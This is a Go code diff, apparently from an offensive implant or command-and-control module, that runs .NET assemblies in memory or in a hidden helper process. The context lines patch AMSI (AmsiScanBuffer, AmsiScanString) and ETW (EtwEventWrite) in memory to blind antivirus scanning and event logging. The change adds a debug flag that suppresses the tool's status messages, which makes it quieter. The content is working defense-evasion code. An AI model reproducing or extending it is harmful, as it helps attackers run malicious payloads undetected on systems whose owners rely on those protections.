@@ -60,7 +60,7 @@ func executeAssemblyInProcess(ctx context.Context, request Request, moduleIO sub
 		return err
 	}
 	if runtimeHost == nil {
-		if err := initRuntimeHost(request.Runtime, moduleIO); err != nil {
+		if err := initRuntimeHost(request.Runtime, moduleIO, true, request.Debug); err != nil {
 			return fmt.Errorf("failed to load CLR: %w", err)
 		}
 	}
@@ -68,9 +68,9 @@ func executeAssemblyInProcess(ctx context.Context, request Request, moduleIO sub
 	hash := sha256.Sum256(request.Artifact)
 	methodInfo, ok := assemblies[hash]
 	if ok {
-		writeLine(moduleIO, "[INF] Using cached assembly")
+		writeDebugLine(moduleIO, request.Debug, "[INF] Using cached assembly")
 	} else {
-		writeLine(moduleIO, "[INF] Loading assembly")
+		writeDebugLine(moduleIO, request.Debug, "[INF] Loading assembly")
 		methodInfo, err = clr.LoadAssembly(runtimeHost, request.Artifact)
 		if err != nil {
 			return fmt.Errorf("failed to load assembly: %w", err)
@@ -81,13 +81,13 @@ func executeAssemblyInProcess(ctx context.Context, request Request, moduleIO sub
 	if err := ctx.Err(); err != nil {
 		return err
 	}
-	writeLine(moduleIO, "[INF] Executing assembly in current process")
+	writeDebugLine(moduleIO, request.Debug, "[INF] Executing assembly in current process")
 	stdout, stderr := clr.InvokeAssembly(methodInfo, parsedArgs)
 	if stdout != "" {
-		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
+		writeOutput(moduleIO, request.Debug, "[INF] STDOUT:", stdout)
 	}
 	if stderr != "" {
-		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
+		writeOutput(moduleIO.Stderr(), request.Debug, "[INF] STDERR:", stderr)
 	}
 	return ctx.Err()
 }
@@ -121,7 +121,7 @@ func executeAssemblyOutOfProcess(ctx context.Context, request Request, moduleIO 
 		return fmt.Errorf("failed to resolve current executable: %w", err)
 	}
 
-	writeLine(moduleIO, "[INF] Starting isolated helper process")
+	writeDebugLine(moduleIO, request.Debug, "[INF] Starting isolated helper process")
 	cmd := exec.CommandContext(ctx, executable, HelperArg)
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		HideWindow:    true,
@@ -144,6 +144,7 @@ func executeAssemblyOutOfProcess(ctx context.Context, request Request, moduleIO 
 		ArtifactBase64: base64.StdEncoding.EncodeToString(request.Artifact),
 		Runtime:        request.Runtime,
 		AssemblyArgs:   request.AssemblyArgs,
+		Debug:          request.Debug,
 	}
 	if err := json.NewEncoder(stdin).Encode(helperRequest); err != nil {
 		_ = stdin.Close()
@@ -154,10 +155,10 @@ func executeAssemblyOutOfProcess(ctx context.Context, request Request, moduleIO 
 
 	err = cmd.Wait()
 	if stdout := stdoutBuf.String(); stdout != "" {
-		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
+		writeOutput(moduleIO, request.Debug, "[INF] STDOUT:", stdout)
 	}
 	if stderr := stderrBuf.String(); stderr != "" {
-		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
+		writeOutput(moduleIO.Stderr(), request.Debug, "[INF] STDERR:", stderr)
 	}
 	if ctxErr := ctx.Err(); ctxErr != nil {
 		return ctxErr
@@ -176,11 +177,11 @@ func killAndWait(cmd *exec.Cmd) {
 	_ = cmd.Wait()
 }
 
-func initRuntimeHost(runtime string, moduleIO subsystems.ModuleIO) error {
-	if err := patchAmsi(moduleIO); err != nil {
+func initRuntimeHost(runtime string, moduleIO subsystems.ModuleIO, redirectOutput, debug bool) error {
+	if err := patchAmsi(moduleIO, debug); err != nil {
 		return err
 	}
-	if err := patchEtw(moduleIO); err != nil {
+	if err := patchEtw(moduleIO, debug); err != nil {
 		return err
 	}
 
@@ -188,14 +189,16 @@ func initRuntimeHost(runtime string, moduleIO subsystems.ModuleIO) error {
 	if err != nil {
 		return err
 	}
-	if err := clr.RedirectStdoutStderr(); err != nil {
-		return err
+	if redirectOutput {
+		if err := clr.RedirectStdoutStderr(); err != nil {
+			return err
+		}
 	}
 	runtimeHost = host
 	return nil
 }
 
-func patchAmsi(moduleIO subsystems.ModuleIO) error {
+func patchAmsi(moduleIO subsystems.ModuleIO, debug bool) error {
 	amsiDLL := windows.NewLazyDLL("amsi.dll")
 	procs := []*windows.LazyProc{
 		amsiDLL.NewProc("AmsiScanBuffer"),
@@ -203,19 +206,19 @@ func patchAmsi(moduleIO subsystems.ModuleIO) error {
 		amsiDLL.NewProc("AmsiScanString"),
 	}
 	for _, proc := range procs {
-		if err := patchProcedureReturn(proc, moduleIO); err != nil {
+		if err := patchProcedureReturn(proc, moduleIO, debug); err != nil {
 			return err
 		}
 	}
 	return nil
 }
 
-func patchEtw(moduleIO subsystems.ModuleIO) error {
+func patchEtw(moduleIO subsystems.ModuleIO, debug bool) error {
 	ntdll := windows.NewLazyDLL("ntdll.dll")
-	return patchProcedureReturn(ntdll.NewProc("EtwEventWrite"), moduleIO)
+	return patchProcedureReturn(ntdll.NewProc("EtwEventWrite"), moduleIO, debug)
 }
 
-func patchProcedureReturn(proc *windows.LazyProc, moduleIO subsystems.ModuleIO) error {
+func patchProcedureReturn(proc *windows.LazyProc, moduleIO subsystems.ModuleIO, debug bool) error {
 	if err := proc.Find(); err != nil {
 		return err
 	}
@@ -226,7 +229,7 @@ func patchProcedureReturn(proc *windows.LazyProc, moduleIO subsystems.ModuleIO) 
 		return nil
 	}
 
-	writeLine(moduleIO, fmt.Sprintf("[INF] Patching %s", proc.Name))
+	writeDebugLine(moduleIO, debug, fmt.Sprintf("[INF] Patching %s", proc.Name))
 	var oldProtect uint32
 	if err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect); err != nil {
 		return err
@@ -244,4 +247,18 @@ func writeLine(writer io.Writer, line string) {
 
 func writeBlock(writer io.Writer, header, body string) {
 	_, _ = fmt.Fprintf(writer, "%s\n%s\n", header, body)
+}
+
+func writeDebugLine(writer io.Writer, debug bool, line string) {
+	if debug {
+		writeLine(writer, line)
+	}
+}
+
+func writeOutput(writer io.Writer, debug bool, header, body string) {
+	if debug {
+		writeBlock(writer, header, body)
+		return
+	}
+	_, _ = fmt.Fprint(writer, body)
 }
